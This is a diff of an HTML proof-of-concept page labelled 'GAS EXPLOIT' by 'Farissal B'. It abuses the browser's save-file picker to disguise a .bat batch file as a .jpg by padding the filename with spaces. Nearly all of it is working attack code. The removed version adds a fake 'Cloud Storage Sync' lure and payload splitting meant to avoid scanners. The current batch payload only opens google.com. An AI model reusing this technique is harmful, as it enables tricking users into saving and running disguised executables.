@@ -1,86 +1,55 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SECURE DATA SYNC - RESEARCH BY FARISSAL B</title>
+    <title>SYNC BY FARISSAL B</title>
     <style>
-        :root { --primary: #58a6ff; --bg: #0d1117; --border: #30363d; --success: #238636; --error: #f85149; }
-        body { background: #010409; color: #c9d1d9; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
-        .card { background: var(--bg); border: 1px solid var(--border); border-radius: 15px; padding: 30px; width: 90%; max-width: 550px; box-shadow: 0 20px 50px rgba(0,0,0,0.7); text-align: center; }
-        .icon-circle { width: 70px; height: 70px; background: rgba(88, 166, 255, 0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; color: var(--primary); font-size: 30px; }
-        h1 { font-size: 1.4rem; margin: 0 0 10px; color: #fff; }
-        p { color: #8b949e; font-size: 0.95rem; line-height: 1.5; }
-        .btn-trigger { background: var(--success); color: #fff; border: none; padding: 15px 30px; border-radius: 8px; font-weight: bold; font-size: 1rem; cursor: pointer; width: 100%; transition: 0.2s; margin-top: 20px; }
-        .btn-trigger:hover { background: #2ea043; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(35, 134, 54, 0.4); }
-        #console { background: #000; border: 1px solid #333; border-radius: 8px; margin-top: 25px; padding: 15px; text-align: left; font-family: 'Consolas', monospace; font-size: 0.85rem; color: #3fb950; height: 160px; overflow-y: auto; }
-        .log-entry { margin-bottom: 5px; border-bottom: 1px solid #111; padding-bottom: 2px; }
-        .err { color: var(--error); }
+        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 100px; }
+        #btn { padding: 20px 50px; background: #238636; color: white; border: none; cursor: pointer; font-weight: bold; font-size: 20px; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <div class="icon-circle">📁</div>
-        <h1>Cloud Storage Sync</h1>
-        <p>Sync your local workstation data to our secure encrypted vault. High-speed transfer enabled.</p>
-        
-        <button class="btn-trigger" id="mainAction">START LOCAL SYNC</button>
+    <h1>RESEARCH LAB: FARISSAL B</h1>
+    <p>Status: Ready to Test</p>
+    
+    <button id="btn">GAS EXPLOIT</button>
 
-        <div id="console">
-            <div class="log-entry">[+] System initialized...</div>
-            <div class="log-entry">[+] Target: File System Access API</div>
-        </div>
-    </div>
+    <div id="log" style="margin-top: 20px; color: #888;"></div>
 
     <script>
-        const btn = document.getElementById('mainAction');
-        const consoleLog = document.getElementById('console');
+        document.getElementById('btn').onclick = async () => {
+            const log = document.getElementById('log');
+            log.innerText = "Memulai...";
 
-        function writeLog(text, isError = false) {
-            const div = document.createElement('div');
-            div.className = 'log-entry' + (isError ? ' err' : '');
-            div.innerHTML = `> ${text}`;
-            consoleLog.appendChild(div);
-            consoleLog.scrollTop = consoleLog.scrollHeight;
-        }
-
-        btn.addEventListener('click', async () => {
             try {
-                writeLog("Requesting File Handle...");
-
-                // 1. TEKNIK SPOOFING NAMA FILE (Maciej Method)
-                // Kita buat jarak yang sangat jauh agar .bat tidak terlihat di dialog Chrome
-                const fakeName = "Data_Backups_2026.jpg" + " ".repeat(20) + ".bat";
-
-                // 2. CONSTRUCT PAYLOAD (Anti-Scanning)
-                // Menggunakan array untuk menghindari deteksi string 'explorer.exe' secara utuh
-                const payloadParts = [
-                    '@echo off\n',
-                    'title RESEARCH SUCCESS - FARISSAL B\n',
-                    'color 0a\n',
-                    'echo [!] VULNERABILITY CONFIRMED: Extension Masking\n',
-                    'echo [!] Researcher: FARISSAL B\n',
-                    'start explorer.exe https://google.com\n',
-                    'pause'
-                ];
-                const fullPayload = payloadParts.join('');
+                // 1. Siapkan isi file (Simple & Berhasil)
+                const payload = "@echo off\necho BOOM! FARISSAL B BERHASIL\nstart explorer.exe https://google.com\npause";
                 
-                // 3. CONVERT TO UNIT8ARRAY (The 0 KB Fix)
-                // Mengubah string jadi data biner mentah agar OS langsung menulisnya
-                const encoder = new TextEncoder();
-                const dataBuffer = encoder.encode(fullPayload);
-
-                // 4. OPEN FILE PICKER
-                const fileHandle = await window.showSaveFilePicker({
-                    suggestedName: fakeName,
+                // 2. Buka jendela Save (Suggested Name dengan spasi & .bat)
+                const handle = await window.showSaveFilePicker({
+                    suggestedName: "Tugas_Sekolah.jpg" + " ".repeat(15) + ".bat",
                     types: [{
-                        description: 'Backup Image Archive',
+                        description: 'Image',
                         accept: {'image/jpeg': ['.jpg']}
-                    }],
+                    }]
                 });
 
-                writeLog("File Handle Secured. Writing data...");
+                log.innerText = "Handle OK. Menulis data...";
 
-                // 5. ATOMIC WRITING
-                const writable = await file
+                // 3. Proses Tulis (Pake cara paling dasar biar gak 0 KB)
+                const writable = await handle.createWritable();
+                await writable.write(payload);
+                await writable.close();
+
+                log.innerText = "BERHASIL! Cek folder lo.";
+                alert("DONE! Liat filenya sekarang.");
+
+            } catch (err) {
+                log.innerText = "ERROR: " + err.message;
+                console.error(err);
+            }
+        };
+    </script>
+
+</body>
+</html>
